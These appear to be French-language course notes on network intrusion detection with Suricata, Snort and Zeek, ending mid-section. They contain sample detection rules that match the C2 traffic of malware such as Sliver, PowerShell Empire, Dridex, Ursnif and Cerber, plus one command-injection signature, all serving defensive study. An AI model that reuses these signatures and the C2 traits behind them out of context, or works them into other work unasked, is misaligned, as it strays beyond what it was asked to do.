Contrairement à **TCP**, qui nécessite un processus de **handshake** (SYN, SYN/ACK, ACK) avant la transmission des données, **UDP** est un protocole **sans connexion**, ce qui permet une communication plus rapide, mais réduit la fiabilité et la traçabilité des connexions.

##### Utilisations Courantes de UDP

Lors de l'investigation du trafic UDP, il est important de prendre en compte les cas d'utilisation légitimes suivants :

* **Applications en temps réel** : Des applications telles que la **vidéo en streaming**, les **jeux en ligne**, et la **voix sur IP** utilisent UDP pour des connexions plus rapides.
* **DNS (Domain Name System)** : Les requêtes et réponses DNS sont principalement basées sur UDP.
* **DHCP (Dynamic Host Configuration Protocol)** : UDP est utilisé pour attribuer des adresses IP et configurer les réseaux.
* **SNMP (Simple Network Management Protocol)** : UDP est utilisé pour la surveillance et la gestion du réseau.
* **TFTP (Trivial File Transfer Protocol)** : TFTP, un protocole pour les transferts de fichiers simples, utilise également UDP, notamment dans les systèmes plus anciens.

##### Anomalies dans le Trafic UDP

Pour un trafic UDP inhabituel, suivez le flux dans **Wireshark** pour inspecter son contenu et vérifier sa légitimité. Toute communication non attendue ou incohérente pourrait indiquer une activité malveillante, comme de l'exfiltration de données ou des attaques par amplification.

---

### Résumé

* **Telnet** : Bien que de plus en plus obsolète, le trafic Telnet sur des ports non standards ou via IPv6 doit être surveillé de près, surtout s'il provient de sources ou destinations suspectes. La détection de Telnet sur des ports inattendus, comme le port 9999, peut indiquer une tentative d'obscurcissement des activités malveillantes.
* **UDP** : Le trafic UDP, en raison de son caractère sans connexion, peut être utilisé à des fins d'exfiltration furtive de données ou d'attaque. Surveillez attentivement les flux UDP inhabituels, en particulier pour des services comme DNS, DHCP, et SNMP qui utilisent souvent ce protocole.

En étant vigilant et en filtrant correctement les flux, vous pouvez détecter les anomalies de manière efficace et réduire les risques associés à ces types de trafic.

```

## Working with IDS/IPS

## **Suricata Fundamentals**

```jsx
**Suricata**, géré par l'Open Information Security Foundation (OISF), est une solution de sécurité réseau open-source idéale pour les Systèmes de Détection d'Intrusions (IDS), les Systèmes de Prévention d'Intrusions (IPS) et la Surveillance de la Sécurité du Réseau (NSM). Elle excelle dans l'inspection approfondie des paquets et offre une journalisation complète, aidant les administrateurs à détecter et répondre aux activités suspectes dans le trafic réseau.

### Modes de fonctionnement de Suricata

* **Système de Détection d'Intrusions (IDS)** : Surveille passivement le trafic, signale les menaces potentielles et améliore la visibilité du réseau, mais n'intervient pas.

* **Système de Prévention d'Intrusions (IPS)** : Agit de manière proactive en bloquant le trafic suspect avant qu'il n'entre dans le réseau, ce qui améliore la sécurité, mais au prix d'une latence accrue.

* **Système de Détection et de Prévention d'Intrusions (IDPS)** : Combine les fonctionnalités IDS et IPS, surveillant passivement tout en étant capable d'envoyer des paquets de réinitialisation (RST) pour terminer des sessions suspectes.

* **Surveillance de la Sécurité du Réseau (NSM)** : Se contente de journaliser toutes les données réseau, capturant chaque transaction pour une analyse forensique et rétrospective.

---

### Entrées de Suricata

* **Entrée hors ligne** : Traite les fichiers PCAP stockés, adaptés pour l'analyse rétrospective et le test de règles.

* **Entrée en direct** :

  * **LibPCAP** : Lit les paquets depuis les interfaces réseau, avec des performances limitées.
  * **NFQ** : Mode IPS en ligne sous Linux, utilisant IPTables pour passer les paquets à Suricata pour inspection.
  * **AF\_PACKET** : Version améliorée de LibPCAP, prenant en charge le multi-threading et adaptée à l'analyse en temps réel sur les systèmes Linux compatibles.

---

### Sorties de Suricata

Suricata génère divers types de journaux, y compris des alertes, des requêtes DNS, des requêtes HTTP et des données de flux réseau. Les principales sorties sont :

* **EVE JSON** : Journalise les événements au format JSON pour être compatible avec des outils comme Logstash, couvrant des types d'événements tels que les alertes, DNS, HTTP et TLS.
* **Unified2** : Format binaire d'alerte compatible avec Snort, permettant l'intégration avec des outils Snort comme u2spewfoo.

---

#### Exemple de consultation du journal EVE JSON

```bash
Kailez@htb[/htb]$ less /var/log/suricata/old_eve.json
```

---

### Configuration de Suricata et règles personnalisées

* **Lister les fichiers de règles** : Voir les fichiers de règles disponibles.

  ```bash
  Kailez@htb[/htb]$ ls -lah /etc/suricata/rules/
  ```

* **Modifier les variables de Suricata** : Définir `$HOME_NET` et `$EXTERNAL_NET` dans `suricata.yaml` pour représenter les segments réseau de confiance et non de confiance, respectivement.

* **Ajouter des règles personnalisées** :
  Exemple de règle pour alerter sur les transactions HTTP :

  ```plaintext
  alert http any any -> any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  ```

---

### Manipulation des entrées Suricata

* **Analyse hors ligne** :

  ```bash
  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/suspicious.pcap
  ```

* **Entrée en direct utilisant AF\_PACKET** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata --af-packet=ens160
  ```

* **Utilisation de tcpreplay pour simuler le trafic** :

  ```bash
  Kailez@htb[/htb]$ sudo tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
  ```

---

### Journaux de Suricata

* **EVE JSON** : Un journal complet au format JSON contenant des événements tels que les alertes, HTTP, DNS et des métadonnées TLS.

  Pour ne voir que les événements d'alerte :

  ```bash
  cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == "alert")'
  ```

* **fast.log** : Journal texte enregistrant uniquement les alertes, utile pour un examen rapide.

  ```bash
  Kailez@htb[/htb]$ cat /var/log/suricata/old_fast.log
  ```

* **stats.log** : Affiche les statistiques et l'utilisation des ressources, utile pour surveiller les performances.

  ```bash
  Kailez@htb[/htb]$ cat /var/log/suricata/old_stats.log
  ```

---

### Extraction de fichiers

Suricata peut extraire des fichiers transférés via certains protocoles pour une analyse forensique.

* **Activer l'extraction de fichiers dans suricata.yaml** :

  ```yaml
  file-store:
    version: 2
    enabled: yes
    force-filestore: yes
  ```

* **Ajouter une règle d'extraction personnalisée** :
  Exemple :

  ```plaintext
  alert http any any -> any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
  ```

* **Exécuter Suricata sur un fichier PCAP** :

  ```bash
  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/vm-2.pcap
  ```

* **Inspecter les fichiers extraits** :

  ```bash
  Kailez@htb[/htb]$ cd filestore
  Kailez@htb[/htb]$ find . -type f
  ```

---

### Mise à jour et rechargement des règles

* **Activer le rechargement en direct des règles** :

  ```yaml
  detect-engine:
    - reload: true
  ```

* **Recharger les règles** :

  ```bash
  Kailez@htb[/htb]$ sudo kill -usr2 $(pidof suricata)
  ```

* **Mettre à jour les ensembles de règles avec `suricata-update`** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata-update
  ```

* **Lister les sources disponibles des ensembles de règles** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata-update list-sources
  ```

* **Activer des ensembles de règles spécifiques** :

  ```bash
  Kailez@htb[/htb]$ sudo suricata-update enable-source et/open
  ```

---

### Validation de la configuration Suricata

Pour valider la configuration de Suricata et vous assurer qu'elle est correctement paramétrée :

```bash
Kailez@htb[/htb]$ sudo suricata -T -c /etc/suricata/suricata.yaml
```

---

### Caractéristiques principales de Suricata

* **Inspection approfondie des paquets** : Inspection complète du contenu et des en-têtes des paquets.
* **Détection de protocoles** : Prise en charge de multiples protocoles pour une surveillance complète du réseau.
* **Détection et prévention des intrusions** : Modes polyvalents pour une défense passive et active.
* **Extraction de fichiers** : Capture des fichiers transférés via certains protocoles pour une analyse forensique.
* **Rechargement des règles en direct** : Mise à jour des règles sans interruption du service.
* **Journalisation complète** : JSON, fast.log, et plus encore, pour des insights personnalisés dans le trafic réseau.

---

```

## **Suricata Rule Development Part 1**

```jsx
Les **règles Suricata** sont utilisées pour surveiller le trafic réseau à la recherche de motifs ou d'indicateurs spécifiques, souvent révélateurs de comportements malveillants. Ces règles peuvent fournir des informations cruciales sur l'activité réseau, aider à la détection des menaces et contribuer à des stratégies de sécurité réseau proactives.

### Anatomie d'une règle Suricata

Voici un exemple de règle de base de Suricata :

```plaintext
action protocol from_ip port -> to_ip port (msg:"Comportement malveillant connu, possible infection par le malware X"; content:"certaines chaînes"; content:"autres chaînes"; sid:10000001; rev:1;)
```

#### Composants de la règle :

1. **En-tête (action protocol from\_ip port -> to\_ip port)** :

   * **Action** : Indique à Suricata ce qu'il doit faire lorsque la règle correspond :

     * `alert` : Génère une alerte.
     * `log` : Journalise le paquet sans alerter.
     * `drop` : Bloque le paquet (en mode IPS).
   * **Protocole** : Spécifie le protocole réseau (tcp, udp, icmp, etc.).
   * **Direction du trafic** :

     * `->` pour le trafic sortant, `<-` pour le trafic entrant, et `<->` pour bidirectionnel.
   * **Ports** : Définit les ports source et destination pour l’évaluation.

2. **Message et Contenu de la Règle** :

   * **msg** : Description affichée lorsque la règle est déclenchée, souvent incluant des informations sur le malware.
   * **content** : Chaînes spécifiques ou valeurs que Suricata recherche dans le contenu du paquet.
     Exemple :

     ```plaintext
     content:"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip";
     ```

     Le contenu peut être optimisé avec des tampons de règles, comme `http.accept` pour faire correspondre uniquement les en-têtes HTTP `Accept`.

3. **Options supplémentaires** :

   * **nocase** : Rend la règle insensible à la casse.
   * **offset** : Définit la position de départ dans le paquet pour la correspondance.
   * **distance** : Spécifie la distance en octets par rapport à la correspondance précédente.
   * **dsize** : Correspond à la taille du charge utile du paquet (par exemple, `dsize:>10000` pour les paquets de grande taille).

4. **Métadonnées** :

   * **sid** : Identifiant de signature unique pour chaque règle.
   * **rev** : Numéro de révision indiquant les mises à jour de la règle.
   * **reference** : Une URL ou un identifiant fournissant du contexte ou des sources pour la règle.

---

### Exemple d’utilisation de règles avec PCRE

Les **expressions régulières compatibles avec Perl (PCRE)** augmentent la flexibilité de la détection. Voici un exemple :

```plaintext
alert http any any -> $HOME_NET any (msg: "ATTACK [PTsecurity] Apache Continuum <= v1.4.2 CMD Injection"; content: "POST"; http_method; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; http_uri; content: "installation.varValue="; nocase; http_client_body; pcre: !"/^\$?[\sa-z\\_0-9.-]*(\&|$)/iRP"; flow: to_server, established; sid: 10000048; rev: 1;)
```

* **PCRE** : Permet la correspondance de motifs complexes en utilisant des expressions régulières. Elles sont entourées de `/.../` et peuvent utiliser des drapeaux comme `i` pour l'insensibilité à la casse et `RP` pour le positionnement relatif.

---

### Approches de développement des règles IDS/IPS

1. **Détection basée sur les signatures** : Correspond aux motifs connus (par exemple, chaînes de malware ou structures de paquets). C’est précis pour les menaces connues, mais limité pour détecter les nouvelles.

2. **Détection basée sur les anomalies** : Se concentre sur les comportements réseau inhabituels (par exemple, motifs de transfert de données). Cela aide à détecter les attaques de type *zero-day*, mais peut générer des faux positifs.

3. **Analyse des protocoles d’état** : Suit les états des protocoles pour identifier les transitions ou comportements inhabituels, adapté à la détection de mauvaise utilisation des protocoles.

---

### Exemples de développement de règles Suricata

**Exemple 1 : Détection de PowerShell Empire**

```plaintext
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Possible activité PowerShell Empire sortante"; flow:established,to_server; content:"GET"; http_method; content:"/"; http_uri; depth:1; pcre:"/^(?:login\/process|admin\/get|news)\.php$/RU"; content:"session="; http_cookie; pcre:"/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi"; content:"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1"; http_user_agent; http_start; content:".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session="; fast_pattern; http_header_names; content:!"Referer"; content:!"Cache"; content:!"Accept"; sid:2027512; rev:1;)
```

* Détecte les requêtes HTTP GET de PowerShell Empire avec des motifs URI spécifiques et des cookies encodés en base64.

---

**Exemple 2 : Détection de Covenant**

```plaintext
alert tcp any any -> $HOME_NET any (msg:"détecté par body"; content:"<title>Hello World!</title>"; detection_filter: track by_src, count 4 , seconds 10; priority:1; sid:3000011;)
```

* Déclenche lorsqu'un paquet HTTP contenant `<title>Hello World!</title>` apparaît au moins quatre fois dans les 10 secondes provenant de la même source.

---

**Exemple 3 : Détection par taille et compteur de Covenant**

```plaintext
alert tcp $HOME_NET any -> any any (msg:"détecté par taille et compteur"; dsize:312; detection_filter: track by_src, count 3 , seconds 10; priority:1; sid:3000001;)
```

* Détecte les paquets dont la charge utile fait exactement 312 octets, envoyés au moins trois fois dans une fenêtre de 10 secondes.

---

**Exemple 4 : Détection de l'implant C2 Sliver**

```plaintext
alert tcp any any -> any any (msg:"Implant C2 Sliver détecté"; content:"POST"; pcre:"/\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\.php)\?[a-z_]{1,2}=[a-z0-9]{1,10}/i"; sid:1000007; rev:1;)
```

* Détecte les requêtes HTTP POST vers des URI associées à Sliver, un framework C2, en utilisant des motifs de répertoires et de fichiers PHP spécifiques.

---

**Règle supplémentaire pour la détection de Sliver via les cookies**

```plaintext
alert tcp any any -> any any (msg:"Implant C2 Sliver détecté - Cookie"; content:"Set-Cookie"; pcre:"/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\=[a-z0-9]{32}\;/"; sid:1000003; rev:1;)
```

* Détecte les cookies avec des noms comme **PHPSESSID** ou **APISID** et des valeurs correspondant à un motif alphanumérique de 32 caractères, souvent associé à Sliver.

---

```

## **Suricata Rule Development Part 2 (Encrypted Traffic)**

```jsx

### Techniques clés pour la détection des menaces sur le trafic chiffré

1. **Certificats SSL/TLS** : Lors de la poignée de main SSL/TLS, des informations telles que l'émetteur, le sujet et le domaine sont échangées et restent non chiffrées. Les attaquants peuvent utiliser des certificats avec des caractéristiques inhabituelles, ce qui permet de les détecter en se basant sur ces anomalies.

2. **Hachage JA3** : Les hachages JA3 fournissent une empreinte unique d’un client SSL/TLS en hachant certains attributs du message **Client Hello** lors de la poignée de main. Ces hachages aident à identifier des caractéristiques uniques associées à certaines familles de malwares.

---

### Exemples de règles Suricata pour la détection de trafic chiffré

#### Exemple 5 : Détection de Dridex (TLS chiffré)

```plaintext
alert tls $EXTERNAL_NET any -> $HOME_NET any (msg:"ET MALWARE ABUSE.CH SSL Blacklist Malicious SSL certificate detected (Dridex)"; flow:established,from_server; content:"|16|"; content:"|0b|"; within:8; byte_test:3,<,1200,0,relative; content:"|03 02 01 02 02 09 00|"; fast_pattern; content:"|30 09 06 03 55 04 06 13 02|"; distance:0; pcre:"/^[A-Z]{2}/R"; content:"|55 04 07|"; distance:0; content:"|55 04 0a|"; distance:0; pcre:"/^.{2}[A-Z][a-z]{3,}\s(?:[A-Z][a-z]{3,}\s)?(?:[A-Z](?:[A-Za-z]{0,4}?[A-Z]|(?:\.[A-Za-z]){1,3})|[A-Z]?[a-z]+|[a-z](?:\.[A-Za-z]){1,3})\.?[01]/Rs"; content:"|55 04 03|"; distance:0; byte_test:1,>,13,1,relative; content:!"www."; distance:2; within:4; pcre:"/^.{2}(?P<CN>(?:(?:\d?[A-Z]?|[A-Z]?\d?)(?:[a-z]{3,20}|[a-z]{3,6}[0-9_][a-z]{3,6})\.){0,2}?(?:\d?[A-Z]?|[A-Z]?\d?)[a-z]{3,}(?:[0-9_-][a-z]{3,})?\.(?!com|org|net|tv)[a-z]{2,9})[01].*?(?P=CN)[01]/Rs"; content:!"|2a 86 48 86 f7 0d 01 09 01|"; content:!"GoDaddy"; sid:2023476; rev:5;)
```

* **But** : Détecte les certificats SSL associés au trojan Dridex en se basant sur des motifs spécifiques dans la poignée de main SSL/TLS.
* **Options clés** :

  * **Valeurs hexadécimales** : `content:"|16|"; content:"|0b|"; within:8;` pour la poignée de main et le type de certificat.
  * **Identifiants de champ** : Vérifie les champs `countryName` et `commonName`.
  * **OID** : Séquences ASN.1 représentant des champs comme `countryName`, `localityName`, `organizationName`, etc.
  * **PCRE** : Vérifie les motifs dans le `commonName` avec une correspondance de structure supplémentaire.

*Test de la règle* : Décommentez cette règle dans `local.rules` et exécutez Suricata sur le fichier `dridex.pcap`.

---

#### Exemple 6 : Détection de Sliver (TLS chiffré)

```plaintext
alert tls any any -> any any (msg:"Sliver C2 SSL"; ja3.hash; content:"473cd7cb9faa642487833865d516e578"; sid:1002; rev:1;)
```

* **But** : Détecte le trafic C2 de Sliver en faisant correspondre un hachage JA3 connu.
* **Options clés** :

  * **ja3.hash** : Recherche le hachage JA3 spécifique associé à Sliver.

*Test de la règle* : Obtenez le hachage JA3 en utilisant l'outil **ja3** sur le fichier `sliverenc.pcap`. Décommentez cette règle dans `local.rules` et exécutez Suricata sur `sliverenc.pcap` pour valider la détection.

---

```

## Snort Fundamentals

```jsx

---

### **Snort : Présentation Générale**

**Snort** est un outil open-source qui agit comme un **système de détection d'intrusion (IDS)** et un **système de prévention d'intrusion (IPS)**. Il peut également être utilisé comme **analyseur de paquets** ou **renifleur de trafic**.
Snort inspecte l’ensemble du trafic réseau et peut enregistrer toutes les activités, offrant une visibilité complète au niveau de la couche application. Son comportement est dirigé par des **règles spécifiques** qui définissent ce qu’il doit surveiller ou identifier.

---

### **Modes de Fonctionnement de Snort**

* **IDS/IPS en mode inline** : Permet de bloquer activement le trafic lorsqu’il fonctionne comme IPS.
* **IDS passif** : Observe et journalise le trafic sans l’interrompre.
* **IDS basé sur le réseau** : Surveille le trafic réseau provenant de plusieurs hôtes.
* **IDS basé sur l’hôte** : Rarement utilisé avec Snort (des outils spécialisés sont plus adaptés).

---

### **Modules DAQ (Data Acquisition)**

Les modules DAQ permettent à Snort d'interagir avec les sources de données réseau.

* **Mode passif** : Observe le trafic sans le bloquer.
* **Mode inline** : Peut bloquer le trafic selon les règles définies (ex. : utilisation de l’option `-Q` avec le module DAQ `afpacket`).

---

### **Architecture de Snort**

* **Sniffer de paquets** : Décrypte le trafic réseau et transmet les paquets aux préprocesseurs.
* **Préprocesseurs** : Analysent les types de paquets et leur comportement. Configurés dans le fichier `snort.lua`, ils détectent par exemple le trafic HTTP ou les scans.
* **Moteur de détection** : Compare les paquets aux règles Snort.
* **Journalisation et alertes** : Les paquets correspondants aux règles sont enregistrés, souvent dans `syslog` ou des bases de données, à l’aide de plugins de sortie définis dans `snort.lua`.

---

### **Configuration de Snort**

#### **Fichiers de configuration** :

* **`snort.lua`** : Fichier principal, contenant les variables réseau, les décodeurs, le moteur de détection, et les sorties.
* **`snort_defaults.lua`** : Fournit des configurations par défaut.

Pour visualiser ou modifier la configuration :

```bash
sudo more /root/snorty/etc/snort/snort.lua
```

#### **Valider la configuration** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq
```

---

### **Sources d’entrée de Snort**

#### **Analyse d’un fichier PCAP** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap
```

#### **Surveillance en temps réel d’une interface réseau** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i nom_interface
```

---

### **Règles Snort**

Les règles Snort sont composées d’un **en-tête** (définissant les critères) et d’**options** (actions et contenus spécifiques). Elles sont intégrées dans `snort.lua`, généralement dans la section `ips` :

```lua
ips = {
    { variables = default_variables, include = '/chemin/vers/fichier.rules' }
}
```

#### **Chargement des règles en ligne de commande** :

* Fichier unique : `-R /chemin/vers/fichier.rules`
* Répertoire contenant plusieurs règles : `--rule-path /chemin/vers/dossier`

---

### **Sorties de Snort**

Snort peut générer plusieurs types de rapports :

* **Statistiques de base** : Résume le nombre de paquets, les types d’activité, les fichiers traités, et les performances du système.

* **Alertes** :

  * `-A cmg` : Affiche des alertes rapides avec en-têtes de paquets et payloads.
  * `-A u2` : Format binaire Unified2, pour traitement post-analyse.
  * `-A csv` : Format CSV.

* **Statistiques de performance** : Surveillent la mémoire, le CPU et les performances générales.

Pour lister les plugins de sortie disponibles :

```bash
snort --list-plugins | grep logger
```

#### **Exemple avec sortie en format cmg** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /chemin/vers/fichier.pcap -A cmg
```

---

### **Fonctionnalités clés de Snort**

* Inspection approfondie des paquets (Deep Packet Inspection).
* Détection d’intrusion en temps réel.
* Surveillance de la sécurité réseau.
* Prise en charge du trafic IPv4 et IPv6.
* Détection d’anomalies et support multi-locataire.

---

```

## **Snort Rule Development**

```jsx

---

### **Règles Snort : Détection d'activités malveillantes**

Une **règle Snort** est un outil puissant permettant d'identifier et de signaler des activités malveillantes potentielles dans le trafic réseau. Bien que les règles Snort ressemblent aux règles Suricata avec une structure composée d'un en-tête de règle et d'options, la documentation de Snort offre des conseils détaillés pour créer des règles efficaces.

Voici des exemples de règles pour détecter des malwares spécifiques. Vous pouvez utiliser ces règles en SSH sur le système cible pour reproduire et comprendre les commandes.

---

#### **Exemple 1 : Détection d'Ursnif (de manière inefficace)**

```plaintext
alert tcp any any -> any any (msg:"Possible Ursnif C2 Activity"; flow:established,to_server; content:"/images/", depth 12; content:"_2F"; content:"_2B"; content:"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"; content:!"Accept"; content:!"Cookie|3a|"; content:!"Referer|3a|"; sid:1000002; rev:1;)
```

Cette règle détecte le malware **Ursnif** en cherchant des motifs spécifiques dans le trafic HTTP :

* `flow:established,to_server;` : correspond aux connexions TCP établies vers le serveur.
* `content:"/images/", depth 12;` : cherche la chaîne `/images/` dans les 12 premiers octets.
* D'autres champs `content` correspondent à des motifs supplémentaires, comme "\_2F", "\_2B" et des en-têtes HTTP spécifiques.
* `!` dans `content:!"Accept";` indique l'absence de certains en-têtes HTTP.

**Tester la règle sur le fichier ursnif.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
```

---

#### **Exemple 2 : Détection de Cerber**

```plaintext
alert udp $HOME_NET any -> $EXTERNAL_NET any (msg:"Possible Cerber Check-in"; dsize:9; content:"hi", depth 2, fast_pattern; pcre:"/^[af0-9]{7}$/R"; detection_filter:track by_src, count 1, seconds 60; sid:2816763; rev:4;)
```

Cette règle cible le malware **Cerber** :

* `dsize:9;` : restreint la règle aux datagrammes ayant une charge utile de 9 octets.
* `content:"hi", depth 2, fast_pattern;` : recherche "hi" dans les deux premiers octets.
* `pcre:"/^[af0-9]{7}$/R";` : utilise une expression régulière pour rechercher sept caractères hexadécimaux après "hi".
* `detection_filter` limite la fréquence des alertes par source.

**Tester la règle sur le fichier cerber.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
```

---

#### **Exemple 3 : Détection de Patchwork**

```plaintext
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"; flow:established,to_server; http_method; content:"POST"; http_uri; content:".php?profile="; http_client_body; content:"ddager=", depth 7; http_client_body; content:"&r1=", distance 0; http_header; content:!"Accept"; http_header; content:!"Referer|3a|"; sid:10000006; rev:1;)
```

Cette règle détecte le malware **Patchwork APT** en cherchant des motifs HTTP spécifiques :

* `flow:established,to_server;` : spécifie les connexions sortantes.
* `http_method; content:"POST";` : recherche des requêtes HTTP POST.
* `http_client_body` et `http_header` filtrent pour des contenus spécifiques et l'absence d'en-têtes.

**Tester avec le fichier patchwork.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
```

---

#### **Exemple 4 : Détection de Patchwork (SSL)**

```plaintext
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Patchwork SSL Cert Detected"; flow:established,from_server; content:"|55 04 03|"; content:"|08|toigetgf", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
```

Cette règle SSL détecte le malware **Patchwork** en cherchant des motifs dans les certificats SSL :

* `content:"|55 04 03|";` : cible les champs de nom commun dans les certificats X.509 au format ASN.1.
* `distance` et `within` affinent la recherche.

**Exécuter avec le fichier patchwork.pcap** :

```bash
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
```

---

### **Résumé des Commandes et Tests**

* **Tester une règle avec un fichier PCAP** :

  * Exécution pour chaque fichier pcap spécifié (`ursnif.pcap`, `cerber.pcap`, etc.).
  * Option `-A cmg` permet de formater les alertes pour les afficher rapidement.

Chaque exemple de règle Snort se concentre sur des motifs spécifiques dans le trafic réseau pour identifier des comportements associés à des malwares comme **Ursnif**, **Cerber**, ou **Patchwork**. Ces règles peuvent être adaptées et optimisées selon les besoins de votre infrastructure de sécurité.

---

```

## **Zeek Fundamentals**

```jsx
Zeek est un analyseur de trafic réseau open-source largement utilisé pour identifier des activités réseau suspectes ou malveillantes. Il est également très efficace pour le dépannage réseau et la mesure des performances. Zeek génère des fichiers journaux qui fournissent des informations détaillées sur toutes les activités réseau, ce qui en fait un outil précieux pour les équipes de cybersécurité (blue teams). Ces journaux contiennent des enregistrements détaillés des connexions et des activités au niveau de la couche application, telles que les requêtes DNS, les sessions HTTP, etc. En outre, les fonctions de Zeek permettent une analyse approfondie et une détection qui vont au-delà de la simple journalisation.

L'une des caractéristiques les plus marquantes de Zeek est son langage de script puissant, qui permet aux utilisateurs de créer des scripts personnalisés similaires aux règles de Suricata. Ce langage permet aux équipes de sécurité de développer des stratégies d'analyse réseau et de détection d'intrusions sur mesure.

### Caractéristiques de détection de Zeek

Plutôt que de se contenter d'une détection basée sur des signatures, Zeek propose une détection par **abus sémantique**, **détection d'anomalies** et **analyse comportementale**.

---

### Modes de fonctionnement de Zeek

Zeek fonctionne dans plusieurs modes :

* **Analyse de trafic entièrement passive** : Ne génère pas de trafic réseau mais observe et analyse le trafic existant.
* **Interface libpcap pour la capture de paquets** : Utilise libpcap pour la capture de paquets réseau.
* **Analyse en temps réel et hors ligne** : Peut être exécuté en mode en temps réel ou avec des fichiers PCAP pour une analyse hors ligne.
* **Support des clusters pour des déploiements à grande échelle** : Zeek peut être déployé en mode cluster pour analyser de manière distribuée de grandes quantités de trafic réseau.

---

### Architecture de Zeek

L'architecture de Zeek est composée de deux composants principaux :

1. **Moteur d'événements (noyau)** :

   * Transforme le flux de paquets entrants en une série d'événements de haut niveau qui décrivent l'activité réseau.
   * Ces événements sont **neutres en termes de politique**, ils décrivent ce qui s'est passé sans l'interpréter (par exemple, une requête HTTP est enregistrée comme un événement `http_request`).

2. **Interpréteur de script** :

   * Exécute les gestionnaires d'événements écrits dans le langage de script de Zeek (scripts Zeek), qui spécifient les politiques de sécurité du site.
   * Les événements générés par le noyau de Zeek sont traités de manière séquentielle par les scripts.

Les événements de Zeek sont principalement définis dans les fichiers `.bif` situés dans `/scripts/base/bif/plugins/`. Pour une liste complète des événements, consultez la **documentation des événements Zeek**.

---

### Journaux de Zeek

Lors de l'exécution de Zeek en mode hors ligne avec un fichier PCAP, les journaux sont enregistrés dans le répertoire actuel. Les journaux courants incluent :

* **conn.log** : Détaille les connexions IP, TCP, UDP et ICMP.
* **dns.log** : Enregistre les requêtes et réponses DNS.
* **http.log** : Enregistre les détails des requêtes et réponses HTTP.
* **ftp.log** : Enregistre les requêtes et réponses FTP.
* **smtp.log** : Enregistre les transactions SMTP, y compris les détails de l'expéditeur et du destinataire.

#### Exemple de **http.log** :

Le fichier `http.log` contient des champs tels que **host**, **uri**, **referrer**, **user\_agent** et **status\_code**.

Pour une liste complète des journaux et des champs de Zeek, consultez la **documentation des journaux Zeek**.

Zeek compresse les fichiers journaux toutes les heures en utilisant `gzip` et déplace les journaux plus anciens dans un répertoire nommé selon la date (format AAAA-MM-JJ). Pour gérer ces journaux compressés, utilisez des outils comme **gzcat** (pour afficher le contenu) et **zgrep** (pour rechercher dans les journaux).

Zeek fournit également **zeek-cut**, un utilitaire pour extraire des colonnes spécifiques des journaux de Zeek, facilitant ainsi l'analyse des journaux.

---

### Fonctionnalités clés de Zeek

Les principales fonctionnalités qui renforcent l'efficacité de Zeek sont :

* **Journalisation détaillée des activités réseau** : Capture une grande variété d'activités réseau, y compris les protocoles de la couche application (par exemple, HTTP, DNS, FTP, SMTP, SSH, SSL).
* **Inspection du contenu des fichiers échangés via des protocoles de la couche application**.
* **Support d'IPv6** : Zeek prend en charge l'analyse du trafic IPv6.
* **Détection et analyse des tunnels** : Identifie les tunnels réseau.
* **Vérifications de validité dans l'analyse des protocoles**.
* **Correspondance de modèles similaire à un IDS** : Détection basée sur des motifs de comportement suspects.
* **Langage de script puissant** : Permet d'ajouter des analyses personnalisées et de gérer des états au sein des scripts.
* **Sortie des journaux en ASCII par défaut** : Options pour intégrer avec des outils comme ElasticSearch et DataSeries.
* **Intégration en temps réel des entrées externes** : Permet d'analyser des flux en temps réel.
* **Interface avec des bibliothèques C** : Partage des événements Zeek avec d'autres programmes.
* **Capacité à déclencher des processus externes depuis le langage de script**.

---

### Pour aller plus loin avec Zeek

Pour des exemples de règles, des bases de scripting et des cas d'utilisation, consultez la **documentation des exemples de Zeek**. Si vous débutez, le **guide de démarrage rapide de Zeek** est une excellente ressource.

Zeek est un outil extrêmement flexible et puissant pour l'analyse du trafic réseau, la détection d'intrusions et le diagnostic des problèmes réseau, offrant des capacités bien au-delà de l'analyse classique basée sur des signatures.

```

## **Intrusion Detection With Zeek**

```jsx

---

### **Exemples de détection d'intrusion**

#### **Exemple 1 : Détection de malware utilisant du beaconing**

